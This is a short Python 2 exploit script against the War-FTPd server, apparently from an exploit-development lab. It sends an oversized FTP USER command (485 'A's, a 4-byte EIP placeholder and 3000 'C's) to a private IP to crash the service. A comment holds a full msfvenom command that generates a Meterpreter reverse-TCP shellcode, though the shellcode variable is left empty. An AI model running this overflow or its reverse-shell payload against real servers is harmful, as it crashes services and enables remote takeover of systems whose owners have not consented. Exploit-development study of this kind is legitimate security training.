#!/usr/bin/python

import socket
import sys
import struct

banner = """
#----------------------------------------------#
War-FTP Server Exploit Fuzzer
1. python war-ftpd-b-crash.py
#----------------------------------------------#
"""

print banner
#msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.73.129 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f c
#shellcode = ()

buffer = "A"*485
buffer += "B"*4
buffer += "C"*3000


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	print "\nDestroy them with lazers..."
	s.connect(('172.16.73.129',21))
	print s.recv(1024)
	s.send('USER ' + buffer + '\r\n')
	print s.recv(1024)
	s.send('PASS anonymous\r\n')
	print s.recv(1024)
	s.close()
	print "\nFire in the hole! Go pick up the pieces!"
except:
	print "ERROR! Shutting it dooooown.."